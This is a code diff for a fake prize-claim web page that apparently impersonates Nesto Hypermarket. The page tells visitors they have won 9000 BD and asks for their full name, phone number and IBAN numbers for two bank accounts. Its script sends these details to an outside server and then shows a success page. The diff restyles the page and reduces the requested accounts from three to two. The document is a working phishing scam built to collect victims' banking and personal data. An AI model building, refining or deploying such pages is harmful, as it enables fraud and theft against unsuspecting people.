@@ -10,54 +10,43 @@
             font-family: Arial, sans-serif;
             margin: 0;
             padding: 0;
+            background-color: #f9f9f9;
+            color: #444;
         }
 
         .container {
-            max-width: 800px;
-            margin: 0 auto;
+            max-width: 600px;
+            margin: 20px auto;
             padding: 20px;
+            background-color: #fff;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
         }
 
         header {
-            background-color: #f0f0f0;
-            padding: 20px 0;
             text-align: center;
+            margin-bottom: 20px;
         }
 
         header img {
             max-width: 200px;
-            /* Increased logo size */
-        }
-
-        #prize-details {
-            background-color: #fff;
-            border-bottom: 1px solid #ccc;
-            padding-bottom: 20px;
-            text-align: center;
-            /* Center align the form */
+            height: auto;
         }
 
         #prize-details form {
             max-width: 400px;
-            /* Adjusted form width */
             margin: 0 auto;
-            /* Center the form */
-            text-align: left;
-            /* Left align form fields */
         }
 
         #prize-details input,
         #prize-details button {
-            display: block;
-            width: calc(100% - 22px);
-            /* Adjusted width to accommodate border */
+            width: 100%;
             padding: 10px;
             margin-bottom: 15px;
-            /* Add some margin between form elements */
             border: 1px solid #ccc;
             border-radius: 5px;
             box-sizing: border-box;
-            /* Include padding in element width */
+            font-size: 16px;
         }
 
         #prize-details button {
@@ -65,119 +54,114 @@
             color: #fff;
             border: none;
             cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        #prize-details button:hover {
+            background-color: #0056b3;
         }
 
         #prize-details input:focus,
         #prize-details button:focus {
             outline: none;
+            border-color: #007bff;
         }
 
-        /* Improved styling for input placeholders */
         ::placeholder {
             color: #999;
         }
 
-        /* Improved styling for input on focus */
-        input:focus {
-            border-color: #007bff;
-        }
-
-        #image-section {
-            text-align: center;
-            margin-bottom: 20px;
-        }
-
-        #image-section img {
-            max-width: 100%;
-            height: auto;
-            max-height: 400px;
-            /* Set a maximum height for the image */
-        }
-
         footer {
-            background-color: #007bff;
-            color: #fff;
             text-align: center;
-            padding: 20px 0;
+            margin-top: 20px;
         }
 
         footer p {
             margin: 0;
+            font-size: 14px;
+            color: #777;
+        }
+
+        #additional-info {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        #additional-info img {
+            max-width: 100%;
+            border-radius: 10px;
+            margin-bottom: 10px;
+        }
+
+        #additional-info p {
+            font-size: 16px;
+            line-height: 1.6;
         }
     </style>
 </head>
 
 <body>
-    <header>
-        <div class="container">
+    
+    <div class="container">
+        <header>
             <img src="./logo.png" alt="Nesto Hypermarket Logo">
-            <h1>Congratulations!</h1>
-        </div>
-    </header>
-    <section id="image-section">
-        <div class="container">
-            <img src="./img.webp" alt="Prize Image">
-        </div>
-    </section>
-    <section id="prize-details">
-        <div class="container">
-            <p>You've won a prize of 9000 BD!</p>
-            <p>To claim your prize, please fill out the form below and provide details for three accounts.</p>
-            <p>You must provide three accounts to transfer the prize money, with a maximum limit of 3000 BD for each
-                account.</p>
+            <div id="additional-info">
+                <img src="./img.webp" alt="Additional Image">
+                <p>Congratulations! You've won a prize of 9000 BD!
+    
+                    <p>To claim your prize, please fill out the form below and provide IBAN numbers for two accounts.</p>
+                    
+                   <p> You must provide two accounts to transfer the prize money, with a maximum limit of 3000 BD for each account.</p>
+            </div>
+            <h1>Prize Claim Form</h1>
+        </header>
+
+        <section id="prize-details">
             <form id="claim-form">
-                <input type="text" id="name" placeholder="Your Name" required>
-                <input type="tel" id="phone" placeholder="Phone Number" required>
-                <input type="text" id="account1" placeholder="Account 1 Number (Maximum 3000 BD)" required>
-                <input type="text" id="account2" placeholder="Account 2 Number (Maximum 3000 BD)" required>
-                <input type="text" id="account3" placeholder="Account 3 Number (Maximum 3000 BD)" required>                
+                <input type="text" id="name" placeholder="Your Full Name" required>
+                <input type="tel" id="phone" placeholder="Your Phone Number" required>
+                <input type="text" id="account1" placeholder="IBAN Number for Account 1" required>
+                <input type="text" id="account2" placeholder="IBAN Number for Account 2" required>
                 <button type="submit">Claim Prize</button>
             </form>
-        </div>
-    </section>
-    <footer>
-        <div class="container">
-            <p>Payment will be received in 30 minutes.</p>
-        </div>
-    </footer>
+        </section>
+        <footer>
+            <p>Payment will be received within 30 minutes.</p>
+        </footer>
 
+    </div>
 
     <script>
-    document.getElementById('claim-form').addEventListener('submit', function (event) {
-    event.preventDefault();
-    
-    // Get form data using getElementById
-    const name = document.getElementById('name').value;
-    const phoneNumber = document.getElementById('phone').value;
-    const account1 = document.getElementById('account1').value;
-    const account2 = document.getElementById('account2').value;
-    const account3 = document.getElementById('account3').value;
+        document.getElementById('claim-form').addEventListener('submit', function (event) {
+            event.preventDefault();
+            const name = document.getElementById('name').value;
+            const phoneNumber = document.getElementById('phone').value;
+            const account1 = document.getElementById('account1').value;
+            const account2 = document.getElementById('account2').value;
 
-    const formData = {
-        name: name,
-        phoneNumber: phoneNumber,
-        account1: account1,
-        account2: account2,
-        account3: account3
-    };
+            const formData = {
+                name: name,
+                phoneNumber: phoneNumber,
+                account1: account1,
+                account2: account2
+            };
 
-    fetch('https://dev.contactivity.io/send-email', {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(formData)
-    })
-    .then(response => {
-        if (response.ok) {
-            window.location.href = 'success.html';
-        } else {
-            alert('Failed to claim prize. Please try again.');
-        }
-    })
-    .catch(error => console.error('Error:', error));
-});
-
+            fetch('https://dev.contactivity.io/send-email', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(formData)
+            })
+            .then(response => {
+                if (response.ok) {
+                    window.location.href = 'success.html';
+                } else {
+                    alert('Failed to claim prize. Please try again.');
+                }
+            })
+            .catch(error => console.error('Error:', error));
+        });
     </script>
 </body>
 
